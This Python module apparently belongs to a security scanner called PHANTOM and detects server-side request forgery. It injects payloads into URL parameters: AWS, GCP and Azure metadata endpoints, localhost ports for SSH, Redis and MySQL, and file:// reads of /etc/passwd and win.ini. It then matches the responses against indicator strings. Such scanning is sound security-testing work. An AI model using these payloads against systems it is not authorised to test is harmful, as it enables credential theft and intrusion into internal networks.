"""
PHANTOM — Server-Side Request Forgery Detection Module

Detection:
1. Inject internal/cloud metadata URLs into parameters
2. Check error messages that might leak internal info
3. Test common SSRF parameters: url, src, source, redirect, link, image, file
4. Probe AWS/GCP/Azure metadata endpoints, localhost ports
"""
from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.target import Target, VulnFinding
from core.findings import Finding, FindingsDB
from core.engine import PhantomEngine
from core.config import PhantomConfig
from utils.http_client import request, Response


class SSRFCheck:
    """Server-Side Request Forgery detection."""

    def __init__(self, engine: PhantomEngine):
        self.engine = engine
        self.target = engine.target

    def run(self):
        """Run SSRF checks against discovered URLs."""
        print("[*] Starting SSRF checks...")
        findings = 0

        # SSRF-prone parameter names
        ssrf_params = ["url", "src", "source", "redirect", "link",
                        "image", "img", "file", "load", "fetch",
                        "callback", "href", "target", "display",
                        "next", "return", "host", "port"]

        urls = self._collect_urls(ssrf_params)
        if not urls:
            print("  [!] No suitable URLs found for SSRF testing")
            return

        for url, param in urls:
            try:
                if self._test_ssrf(url, param):
                    findings += 1
            except Exception as e:
                print(f"  [!] SSRF test failed for {url}: {e}")
                continue

        print(f"  [+] SSRF checks complete — {findings} finding(s)")

    # ── URL collection ──────────────────────────────────────────────

    def _collect_urls(self, target_params: list[str]) -> list[tuple[str, str]]:
        """Find URLs with SSRF-prone parameters."""
        results = []
        sources = list(set(
            self.target.directories + self.target.js_endpoints
        ))

        for ep in sources:
            if "?" not in ep:
                clean = ep.split("?")[0]
                for param in target_params:
                    results.append((f"{clean}?{param}=test", param))
                continue

            qs = ep.split("?", 1)[1]
            for part in qs.split("&"):
                if "=" not in part:
                    continue
                pname = part.split("=")[0].lower()
                if pname in target_params:
                    results.append((ep, pname))

            clean = ep.split("?")[0]
            for param in target_params:
                test_url = f"{clean}?{param}=test"
                if not any(test_url == r[0] for r in results):
                    results.append((test_url, param))

        # Deduplicate
        seen = set()
        unique = []
        for url, param in results:
            key = f"{url}:{param}"
            if key not in seen:
                seen.add(key)
                unique.append((url, param))
        return unique

    # ── SSRF testing ────────────────────────────────────────────────

    def _test_ssrf(self, url: str, param: str) -> bool:
        """Inject internal/cloud URLs and check for SSRF indicators."""
        payloads = [
            # Cloud metadata endpoints
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "meta-data", "public-keys"]),
            ("http://169.254.169.254/latest/user-data/", ["ami-id", "instance-id"]),
            ("http://metadata.google.internal/", ["metadata", "google"]),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "network"]),
            # Localhost probes
            ("http://127.0.0.1:80", ["<html", "httpd", "nginx", "apache"]),
            ("http://127.0.0.1:22", ["SSH", "OpenSSH"]),
            ("http://localhost:22", ["SSH", "OpenSSH"]),
            ("http://[::1]:80", ["<html", "httpd"]),
            ("http://127.0.0.1:6379", ["redis", "-ERR"]),
            ("http://127.0.0.1:3306", ["mysql", "MariaDB"]),
            ("http://127.0.0.1:8080", ["<html", "httpd"]),
            # File protocol
            ("file:///etc/passwd", ["root:", "www-data"]),
            ("file:///c:/windows/win.ini", ["[fonts]"]),
        ]

        for payload, indicators in payloads:
            test_url = self._inject(url, param, payload)
            try:
                resp = request(test_url, timeout=10)
                if not resp:
                    continue

                body = resp.body

                # Check for SSRF indicators in response body
                for indicator in indicators:
                    if indicator.lower() in body.lower():
                        evidence = body[:300].strip()
                        self.engine.findings.add(Finding(
                            name="Server-Side Request Forgery (SSRF)",
                            severity="HIGH",
                            url=url,
                            param=param,
                            payload=payload,
                            evidence=evidence,
                            phase="vuln",
                        ))
                        print(f"  [+] SSRF @ {url} ?{param}")
                        return True

                # Check for timing differences that indicate
                # the server tried to connect somewhere
                if resp.elapsed and resp.elapsed > 5.0:
                    # Long response time might mean connection attempt
                    # to a non-responsive internal host
                    pass

            except Exception:
                continue

        return False

    # ── Helpers ─────────────────────────────────────────────────────

    def _inject(self, url: str, param: str, payload: str) -> str:
        """Replace parameter value with SSRF payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_qs = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_qs))
